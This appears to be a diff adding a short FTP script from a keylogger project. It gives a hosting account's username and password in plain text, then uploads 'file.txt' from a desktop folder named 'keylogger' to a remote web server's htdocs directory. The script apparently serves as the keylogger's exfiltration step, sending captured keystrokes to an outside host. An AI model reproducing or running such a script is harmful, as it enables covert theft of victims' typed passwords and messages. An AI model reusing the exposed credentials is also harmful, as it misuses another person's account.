@@ -1,0 +1,4 @@
+epiz_33647112
+wzULvYsb6FBs8x
+put "C:\Users\Akhilsh Shukla\Desktop\keylogger\file.txt" "/htdocs/file.txt"
+quit
